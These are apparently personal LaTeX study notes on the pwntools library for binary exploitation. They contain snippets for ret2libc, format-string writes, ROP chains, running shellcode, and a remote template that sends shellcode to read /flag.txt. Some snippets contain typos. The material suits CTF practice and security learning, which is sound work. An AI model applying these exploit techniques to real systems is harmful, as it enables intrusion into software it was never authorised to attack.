\section{Binary exploitation with pwntools}

\url{https://tc.gts3.org/cs6265/2019/tut/tut03-02-pwntools.html}

\href{https://github.com/Gallopsled/pwntools-tutorial#readme}{pwntools-tutorial}

\url{https://github.com/nnamon/linux-exploitation-course/blob/master/lessons/3_intro_to_tools/lessonplan.md}

\url{https://www.youtube.com/watch?v=H-Uy5mgyllk}

\subsection{global functions}
\subsubsection{pause}
 \verb+pause(n=None)+ Waits for either user input or a specific number of
 seconds. Usefull to pause in order to go to a debuger and to attach it to the
 running process.

\subsection{Processes and Communication}
\subsubsection{Processes}
A process is the main way to interact with something in pwntools, and starting
one is easy.
\begin{verbatim}
p = process('./vulnerable_binary')
# or for a remote 
p = remote('my.special.ip', port)
\end{verbatim}

\subsubsection{Sending Data to Processes}
\begin{itemize}
    \item  \verb+p.send(data)+ Sends \verb+data+ to the process. Data can either be a
        string or a bytes-like object - pwntools handles it.
    \item  \verb+p.sendline(data)+: Sends \verb+data+ to the process followed
        by a newline character. (equiivalent to \verb-p.send(data + '\n')-)
    \item \verb+sendafter(delim, data, timeout=default)+ a combination of
        \verb+recvuntil(delim, timeout)+ and \verb+send(data)+
\end{itemize}

\subsubsection{Receiving Data From Processes}
\begin{itemize}
    \item \verb+p.recv(numb)+: receive \verb+numb+ of bytes
    \item \verb+p.recvuntil(delimiter, drop=False)+: Receives all the data
        until it encounters the \verb+delimiter+, after which it returns the
        data. If drop is \verb+True+ then the returned data does not include
        the \verb+delimiter+.
    \item \verb+p.recvline(keepends=True)+: Essentially equivalent to
        \verb+p.recvuntil('\n', drop=keepends)+.  Receives up until a \verb+\n+
        is reached, then returns the data including the \verb+\n+ if keepends
        is \verb+True+.
    \item \verb+p.clean(timeout=0.02)+ Receives all data for timeout seconds
        and returns it. Another similar function is \verb+p.recvall()+, but
        this regularly takes far too long to execute so \verb+p.clean()+ is
        much better.
\end{itemize}

\subsubsection{Interactive}
\begin{verbatim}
p.interactive(prompt = pwnlib.term.text.bold_red('$') + ' ') 
\end{verbatim}
Does simultaneous reading and writing to the tube. In principle this just
connects the tube to standard in and standard out, but in practice this is much
more usable, since we are using pwnlib.term to print a floating prompt.

\subsection{Timeout}
All receiving functions all contain a timeout parameter as well as the other listed ones.
 For example, \verb+p.recv(numb=16, timeout=1)+ will execute but if \verb+numb+
 bytes are not received within \verb+timeout+ seconds the data is buffered for
 the next receiving function and an empty string \verb+''+ is returned.


 \subsection{Logging and Context}
 \subsubsection{Logging}

 Logging is a very useful feature of pwntools that lets you know where in your
 code you've gotten up to, and you can log in different ways for different
 types of data.

 Logging level is adjusted in \verb+context.log_level+ the possible values are:
 \begin{verbatim}
['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']
 \end{verbatim}

 the level can also be adjusted on the logger \verb+log.setLevel(level)+

 Logging can be done in console \verb+context.log_console+ or in file
 \verb+context.log_file+

 \begin{verbatim}
 logfile = tempfile.mktemp()
 context.log_file = logfile
 \end{verbatim}

 logging functions:
 \begin{itemize}
    \item \verb+log.log(level, text)+
    \item \verb+log.info(text)+
    \item \verb+og.success(text)+
    \item \verb+log.error(text)+
    \item \verb+log.failure(text)+
    \item \verb+log.debug(text)+
    \item \verb+log.warning(text)+
    \item \verb+log.critical(text)+
 \end{itemize}



\subsubsection{Context}

\verb+context+ is a global variable in pwntools that allows to set certain
values once and all future functions automatically use that data.
\begin{verbatim}
context.arch = 'i386'
context.os = 'linux'
context.endian = 'little'
context.bits = 64
\end{verbatim}

Now every time you generate shellcode or use the \verb+p64()+ and \verb+u64()+
functions it will be specifically designed to use the context variables,
meaning it will just work.

the \verb+context+ can be grabbed automatically from the binary
\begin{verbatim}
context.binary = './vulnerable_binary'
# then it is possible to instantiate the process like this
p = process()
\end{verbatim}

the command \verb+context.binary = './vulnerable_binary'+ will automatically
output \verb+checksec+ of the binary.


\subsection{Packing}
Packing with the in-built python \verb+struct+ module is often a pain with
loads of unnecessary options to remember. pwntools makes this a breeze, using
the \verb+context+ global variable to automatically calculate how the packing
should work.

\subsubsection{p64(addr)}
Packs \verb+addr+ depending on \verb+context+, which by default is little-endian.
\begin{verbatim}
p64(0x04030201) == b'\x01\x02\x03\x04'

context.endian = 'big'
p64(0x04030201) == b'\x04\x03\x02\x01'
\end{verbatim}

note: \verb+p64()+ returns a bytes-like object, so you'll have to form your
padding as \verb+b'A'+ instead of just \verb+'A'+.

\subsubsection{u64(data)}

Unpacks \verb+data+ depending on \verb+context+; exact opposite of \verb+p64()+.

\subsubsection{flat(*args)}
Can take a bunch of arguments and packs them all according to context. The
\href{http://docs.pwntools.com/en/stable/util/packing.html#pwnlib.util.packing.flat}{full
functionality} is quite complex, but essentially:
\begin{verbatim}
payload = flat(
    0x01020304,
    0x59549342,
    0x12186354
)
\end{verbatim}
is equivalent to:
\begin{verbatim}
payload = p64(0x01020304) + p64(0x59549342) + p64(0x12186354)
\end{verbatim}

\verb+flat()+ uses context, so unless you specify that it is 64 bits it will
attempt to pack it as 32 bits.


\subsection{ELF}

The pwntools \verb+ELF+ class is the most useful class you will probably ever
need, so understanding the full power of it will make your life easier.
Essentially, the \verb+ELF+ class allows you to look up variables at runtime
and stop hardcoding.

\subsubsection{Creating an ELF object}
\begin{verbatim}
elf = ELF('./vulnerable_program')
\end{verbatim}

\subsubsection{Getting a process}
Rather than specifying another process, we can just get it from the \verb+ELF+:
\begin{verbatim}
p = elf.process()
\end{verbatim}

\subsubsection{PLT and GOT}

\begin{verbatim}
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
\end{verbatim}

\subsubsection{Functions/symbols}
Need to return to a function called \verb+vuln+? Don't bother using a
disassembler or debugger to find where it is.
\begin{verbatim}
main_address = elf.functions['vuln']
\end{verbatim}
Note that \verb+elf.functions+ returns a \verb+Function+ object, so if you only
want the address you can use \verb+elf.symbols+:
\begin{verbatim}
main_address = elf.symbols['symbol']
\end{verbatim}

\subsubsection{elf.libc}
When local, we can grab the \verb+libc+ the binary is running with. Easy peasy.
\begin{verbatim}
libc = elf.libc
\end{verbatim}

\subsubsection{elf.search(needle, writable=False)}
Search the entire binary for a specific sequence \verb+needle+ of characters.
Very useful when trying to do a \verb+ret2libc+. If \verb+writable+ is set it
only checks for sections in memory that you can write to. Note this returns a
{\bf generator} so if you want the first match you have to enclose it in
\verb+next()+
\begin{verbatim}
binsh = next(libc.search(b'/bin/sh\x00'))
\end{verbatim}

\subsubsection{elf.address}
\verb+elf.address+ is the base address of the binary. If the binary does not
have PIE enabled, then it's absolute; if it does, all addresses are relative
(they pretend the binary base is \verb+0x0+).

Setting the \verb+address+ value automatically updates the address of
\verb+symbols+, \verb+got+, \verb+plt+ and \verb+functions+, which makes it
invaluable when adjusting for PIE or ASLR.

Let's say you leak the base address of \verb+libc+ while ASLR is enabled; with
pwntools, it's ridiculously easy to get the location of system for a
\verb+ret2libc+.
\begin{verbatim}
libc = elf.libc
libc.address = 0xf7f23000           # You 'leaked' this

system = libc.symbols['system']
binsh = next(libc.search(b'/bin/sh\x00'))
exit_addr = libc.symbols['exit']

# Now you can do the ret2libc
\end{verbatim}


\subsection{FmStr}

\subsubsection{send payload}

FmStr need a function in charge to deliver the payload and return the result:

\begin{verbatim}
def send_payload(payload):
    .. . SNIP. ..
   p.sendline(payload)
    .. . SNIP. ..
   return p.recvline()
\end{verbatim}

\subsubsection{with offset known}

\begin{verbatim}
fmstr = FmtStr(execute_fmt=send_payload, offset=10)
fmstr.write(0x404078, compare_value)
fmstr.execute_writes()
\end{verbatim}



\subsubsection{Full auto}

Here will first iterate to find the offset

\begin{verbatim}
# Assume a process that reads a string
# and gives this string as the first argument
# of a printf() call
# It do this indefinitely

# Create a FmtStr object and give to him the function
format_string = FmtStr(execute_fmt=send_payload)
format_string.write(0x0, 0x1337babe) # write 0x1337babe at 0x0
format_string.write(0x1337babe, 0x0) # write 0x0 at 0x1337babe
format_string.execute_writes()
\end{verbatim}


\subsubsection{fmstr\_payload}
Makes payload with given parameter. It can generate payload for 32 or 64 bits
architectures. 

\begin{verbatim}
elf = ELF('./auth')
AUTH = elf.sym['auth']
payload = fmtstr_payload(7, {AUTH : 10})
\end{verbatim}

\subsection{ROP}

The \verb+ROP+ class is insanely powerful, enabling you to create readable ropchains in many less lines.

\subsubsection{Creating a ROP object}
\begin{verbatim}
rop = ROP(elf)
\end{verbatim}

\subsubsection{Adding padding}
\begin{verbatim}
rop.raw('A' * 64)
\end{verbatim}

\subsubsection{Adding a packed value}
\begin{verbatim}
rop.raw(0x12345678)
\end{verbatim}

\subsubsection{calling the function win}
\begin{verbatim}
rop.win()
# if you need parameters:
rop.win(0xdeadc0de, 0xdeadbeef)
\end{verbatim}


\subsubsection{Dumping the logic}
\begin{verbatim}
from pwn import *

elf = context.binary = ELF('./showcase')
rop = ROP(elf)

rop.win1(0x12345678)
rop.win2(0xdeadbeef, 0xdeadc0de)
rop.flag(0xc0ded00d)

print(rop.dump())
\end{verbatim}

\subsubsection{Sending the chain}
\begin{verbatim}
p.sendline(rop.chain())
\end{verbatim}

\subsubsection{Showcase}
Without pwntools:
\begin{verbatim}
payload = flat(
    POP_RDI,
    0xdeadc0de,
    elf.sym['win1'],
    POP_RDI,
    0xdeadbeef,
    POP_RSI,
    0x98765432,
    elf.sym['win2'],
    POP_RDI,
    0x54545454,
    elf.sym['flag']
)

p.sendline(payload)
\end{verbatim}

With pwntools:
\begin{verbatim}
rop.win1(0xdeadc0de)
rop.win2(0xdeadbeef, 0x98765432)
rop.flag(0x54545454)

p.sendline(rop.chain())
\end{verbatim}

\subsection{Extract Shellcode from an elf binary}
\begin{verbatim}
#!/usr/bin/python3

import sys
from pwn import *

context(os="linux", arch="amd64", log_level="error")

file = ELF(sys.argv[1])
shellcode = file.section(".text")
print(shellcode.hex())
\end{verbatim}

\subsection{load and run shellcode}

\begin{verbatim}
#!/usr/bin/python3

import sys
from pwn import *

context(os="linux", arch="amd64", log_level="error")

run_shellcode(unhex(sys.argv[1])).interactive()
\end{verbatim}



\subsection{Shellcode to binary}

\begin{verbatim}
#!/usr/bin/python3

import sys, os, stat
from pwn import *

context(os="linux", arch="amd64", log_level="error")

ELF.from_bytes(unhex(sys.argv[1])).save(sys.argv[2])
os.chmod(sys.argv[2], stat.S_IEXEC)
\end{verbatim}

\subsection{local binary exploit}
\url{https://docs.pwntools.com/en/stable/tubes/processes.html}

generate a template like :
\begin{verbatim}
$ pwntools-pwn template i<binary>
\end{verbatim}

or start simply:
\begin{verbatim}
#!/usr/bin/env python3

from pwn import *

def main():
    p = process("/bin/sh")
    p.interactive()

if __name__ == '__main__':
    main()
\end{verbatim}

\begin{verbatim}
./2_interactive
Welcome to the Super Secure Shell
Password: TheRealPassword
Correct password!
$ id
uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),110(lxd),999(docker)
$ exit
\end{verbatim}


\subsection{Debugging with GDB}
\url{https://github.com/Gallopsled/pwntools-tutorial/blob/master/debugging.md}
\subsubsection{GDB}

\begin{verbatim}
gdbscript = '''
b *0x5555555550a0 
b *0x55555555532a 
b *0x55555555526a 
continue
'''.format(**locals())

io = start()

context.terminal=['lxterminal', '-e', 'sh', '-c']
g = gdb.attach(io, gdbscript="""
    b *0x5555555550a0
    c
""")

io.wait(10)
\end{verbatim}

so when the py program will hit a breakpoint it will suspend until
\verb+continue+ action is taken into gdb 
\subsubsection{Manual approch}


Using the following script, we can print the process id before the interaction with the program happens.

\begin{verbatim}
    # Start a new process
    p = process("../build/3_reversing")
    # Print pid
    raw_input(str(p.proc.pid))

    p.send()
    ...
    p.interactive()

if __name__ == "__main__":
    main()
\end{verbatim}

with the pid it is possible to attach gdb
\begin{verbatim}
sudo gdb -p <pid>
\end{verbatim}

\subsubsection{Automated approch}
\href{http://docs.pwntools.com/en/stable/gdb.html}{here}


\subsection{Remote binary exploit}
\url{https://docs.pwntools.com/en/stable/tubes/sockets.html}

generate a template like :
\begin{verbatim}
$ pwntools-pwn template --host 159.65.63.151 --port 30138
\end{verbatim}

or
\begin{verbatim}
def main():
    # Start a local process
    p = remote("localhost", 1330)
    p.interactive()

if __name__ == "__main__":
    main()
\end{verbatim}

and edit the template to send / recv data from the target

\begin{verbatim}
io = start()
#gen = cyclic_gen()
#payload = gen.get(2000)
syscall = shellcraft.execve(path='/bin/cat',argv=['/bin/cat', '/flag.txt'])
print(syscall)
payload = asm(syscall).hex()
io.send(payload)
flag = io.recvline()
log.success(flag)

io.interactive()
\end{verbatim}


\subsection{Core file}

\subsubsection{Loading a core file}
access the core dump of a crashed process \verb+io+:
\begin{verbatim}
io.sendline(crash_payload).wait()
core = io.corefile
\end{verbatim}

arbitrary coredump can be loaded with:
\begin{verbatim}
core = cCoredump('./core')
\end{verbatim}

\subsubsection{Accessing to registers}
\begin{verbatim}
core.sp
core.pc
core.registers
\end{verbatim}

\subsubsection{Accessing memory}
Memory can be accessed directly via \verb+read()+ or \verb+write()+, and also
via \verb+pack()+ or \verb+unpack()+ or even \verb+string()+.
\begin{verbatim}
\end{verbatim}


\section{notes}
 \verb+ld+ seems to have new by default protection regarding building elf from
shellcode.
add the following options  in
\verb+/usr/lib/python3.10/site-packages/pwnlib/asm.py+ to bypass that
\begin{verbatim}
linker_options = ['-z', 'execstack', '--no-warn-rwx-segments', '--no-warn-execstack']
\end{verbatim}

\begin{verbatim}
    token = 0x41414141
    p.send(p32(token))
\end{verbatim}
\verb+p32()+ to pack integers into little
